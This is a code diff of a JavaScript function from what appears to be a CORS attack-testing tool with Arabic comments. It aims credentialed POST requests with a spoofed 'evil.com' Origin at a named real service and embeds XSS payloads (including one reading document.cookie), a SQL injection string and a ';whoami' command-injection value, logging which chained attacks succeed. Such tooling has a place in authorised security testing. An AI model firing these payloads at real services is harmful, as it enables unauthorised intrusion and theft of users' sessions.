@@ -1151,78 +1151,78 @@
             }
         }
         
-        async function testChainedAttacks() {
-            log('⛓️ بدء اختبار Chained Attacks...', 'info');
-            
-            const url = document.getElementById('targetUrl').value;
-            
-            // سلسلة من الهجمات المعقدة
-            const chainedTests = [
-                {
-                    name: 'CORS + XSS Chain',
-                    origin: 'https://evil.com',
-                    body: JSON.stringify({
-                        origin: 'https://videoeditor.streamlabs.com',
-                        intent: 'connect',
-                        noAuthTarget: 'login',
-                        payload: '<script>alert(document.cookie)</script>'
-                    })
-                },
-                {
-                    name: 'CORS + CSRF Chain',
-                    origin: 'https://evil.com',
-                    headers: {
-                        'X-Requested-With': 'XMLHttpRequest',
-                        'X-CSRF-Token': 'fake-token'
+            async function testChainedAttacks() {
+                log('⛓️ بدء اختبار Chained Attacks...', 'info');
+                
+                const url = document.getElementById('targetUrl').value;
+                
+                // سلسلة من الهجمات المعقدة
+                const chainedTests = [
+                    {
+                        name: 'CORS + XSS Chain',
+                        origin: 'https://evil.com',
+                        body: JSON.stringify({
+                            origin: 'https://videoeditor.streamlabs.com',
+                            intent: 'connect',
+                            noAuthTarget: 'login',
+                            payload: '<img src=x onerror=alert(1)>'
+                        })
+                    },
+                    {
+                        name: 'CORS + CSRF Chain',
+                        origin: 'https://evil.com',
+                        headers: {
+                            'X-Requested-With': 'XMLHttpRequest',
+                            'X-CSRF-Token': 'fake-token'
+                        }
+                    },
+                    {
+                        name: 'CORS + SQLi Chain',
+                        origin: 'https://evil.com',
+                        body: JSON.stringify({
+                            origin: "https://videoeditor.streamlabs.com' OR '1'='1",
+                            intent: 'connect',
+                            noAuthTarget: 'login'
+                        })
+                    },
+                    {
+                        name: 'CORS + Command Injection',
+                        origin: 'https://evil.com',
+                        body: JSON.stringify({
+                            origin: 'https://videoeditor.streamlabs.com;whoami',
+                            intent: 'connect',
+                            noAuthTarget: 'login'
+                        })
                     }
-                },
-                {
-                    name: 'CORS + SQLi Chain',
-                    origin: 'https://evil.com',
-                    body: JSON.stringify({
-                        origin: "https://videoeditor.streamlabs.com' OR '1'='1",
-                        intent: 'connect',
-                        noAuthTarget: 'login'
-                    })
-                },
-                {
-                    name: 'CORS + Command Injection',
-                    origin: 'https://evil.com',
-                    body: JSON.stringify({
-                        origin: 'https://videoeditor.streamlabs.com;whoami',
-                        intent: 'connect',
-                        noAuthTarget: 'login'
-                    })
-                }
-            ];
-            
-            for (const test of chainedTests) {
-                stats.total++;
-                const headers = {
-                    ...JSON.parse(document.getElementById('customHeaders').value || '{}'),
-                    'Origin': test.origin,
-                    ...test.headers
-                };
+                ];
                 
-                const result = await makeRequest(url, {
-                    method: 'POST',
-                    headers: headers,
-                    body: test.body || document.getElementById('requestBody').value,
-                    mode: 'cors',
-                    credentials: 'include'
-                });
-                
-                if (result.success) {
-                    const allowOrigin = result.response.headers['access-control-allow-origin'];
-                    if (allowOrigin === test.origin || allowOrigin === '*') {
-                        log(`🚨 Chained attack possible: ${test.name}`, 'vulnerable', {
-                            test: test,
-                            response: result.response
-                        });
+                for (const test of chainedTests) {
+                    stats.total++;
+                    const headers = {
+                        ...JSON.parse(document.getElementById('customHeaders').value || '{}'),
+                        'Origin': test.origin,
+                        ...test.headers
+                    };
+                    
+                    const result = await makeRequest(url, {
+                        method: 'POST',
+                        headers: headers,
+                        body: test.body || document.getElementById('requestBody').value,
+                        mode: 'cors',
+                        credentials: 'include'
+                    });
+                    
+                    if (result.success) {
+                        const allowOrigin = result.response.headers['access-control-allow-origin'];
+                        if (allowOrigin === test.origin || allowOrigin === '*') {
+                            log(`🚨 Chained attack possible: ${test.name}`, 'vulnerable', {
+                                test: test,
+                                response: result.response
+                            });
+                        }
                     }
                 }
             }
-        }
         
         async function runAllTests() {
             clearResults();
